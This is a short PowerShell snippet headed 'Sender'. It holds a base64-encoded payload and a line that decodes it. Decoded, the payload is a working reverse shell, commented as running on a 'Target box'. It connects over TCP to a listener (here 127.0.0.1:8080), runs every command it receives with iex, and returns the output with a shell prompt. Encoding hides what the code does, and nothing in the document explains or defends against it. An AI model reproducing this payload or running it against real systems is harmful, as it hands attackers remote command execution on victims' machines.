#Sender

$encoded = "I3RoaXMgaXMgYSBwb3dlcnNoZWxsIC0gU2VydmVyIC0gVGFyZ2V0IGJveAojIERlZmluZSB0aGUgSVAgYWRkcmVzcyBhbmQgcG9ydCBudW1iZXIgZm9yIHRoZSBzZXJ2ZXIKJGlwID0gIjEyNy4wLjAuMSIKJHBvcnQgPSA4MDgwCgojIENyZWF0ZSBhIG5ldyBUQ1AgY2xpZW50IGFuZCBjb25uZWN0IHRvIHRoZSBzZXJ2ZXIKJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgkaXAsICRwb3J0KQoKIyBHZXQgdGhlIHN0cmVhbSBmcm9tIHRoZSBjbGllbnQKJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCkKCiMgQ3JlYXRlIGFuIGFycmF5IG9mIGJ5dGVzIHRvIHN0b3JlIGRhdGEgcmVjZWl2ZWQgZnJvbSB0aGUgc2VydmVyCltieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfQoKIyBMb29wIHVudGlsIHRoZSBzdHJlYW0gaXMgY2xvc2VkCndoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKewogICMgQ29udmVydCB0aGUgcmVjZWl2ZWQgYnl0ZXMgdG8gYSBzdHJpbmcKICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKQoKICAjIEV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQgYW5kIHN0b3JlIHRoZSBvdXRwdXQKICAkc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICkKCiAgIyBBcHBlbmQgdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3RvcnkgdG8gdGhlIG91dHB1dAogICRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiCgogICMgQ29udmVydCB0aGUgb3V0cHV0IHN0cmluZyB0byBhbiBhcnJheSBvZiBieXRlcwogICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKQoKICAjIFdyaXRlIHRoZSBieXRlcyB0byB0aGUgc3RyZWFtIGFuZCBmbHVzaCB0aGUgc3RyZWFtCiAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKQogICRzdHJlYW0uRmx1c2goKQp9CgojIENsb3NlIHRoZSBjbGllbnQgYW5kIHN0cmVhbSB3aGVuIHRoZSBsb29wIGlzIGZpbmlzaGVkCiRjbGllbnQuQ2xvc2UoKQokc3RyZWFtLkNsb3NlKCk="
$unencoded = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encoded))